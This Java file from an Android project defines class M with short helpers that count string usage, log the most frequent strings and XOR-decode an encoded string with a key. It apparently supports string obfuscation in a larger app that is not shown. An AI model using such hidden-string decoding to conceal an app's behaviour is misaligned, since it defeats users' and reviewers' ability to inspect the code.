package com.android.mm;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Hashtable;
import java.util.TreeMap;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;

import android.content.Context;

public class M {
	private static final String TAG = "M";

	static Hashtable<String, Integer> strings = new Hashtable<String, Integer>();

	// static TreeMap<String, Integer> strings = new TreeMap<String, Integer>();

	public static String e(String message) {
		if (!strings.containsKey(message)) {
			strings.put(message, 1);
		} else {
			int value = strings.get(message);
			strings.put(message, value + 1);
		}
		if (message.contains("PACK")) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (e) Error: $PACK$ in message %s", message);
			}
		}
		return message;
	}

	public static String d(String encoded, String otp) {
		byte[] ebytes = encoded.getBytes();
		byte[] obytes = otp.getBytes();

		for (int i = 0; i < obytes.length; i++) {
			ebytes[i] = (byte) (ebytes[i] ^ obytes[i]);
		}
		return new String(ebytes);
	}

	public static void printMostused() {
		ArrayList<String> results = new ArrayList<String>();
		for (String key : strings.keySet()) {
			if (Cfg.DEBUG) {
				//Check.log(TAG + " (printMostused) : %s=%s", key, strings.get(key));
			}
			results.add(String.format("%5d : %s", strings.get(key), key));
		}
		Collections.sort(results, Collections.reverseOrder());
		StringBuffer sb = new StringBuffer();
		int count = 0;
		for (String string : results) {
			sb.append(string);
			sb.append("\n");
			count++;
			if(count>10){
				break;
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (printMostused): %s", sb.toString());
		}
	}
}
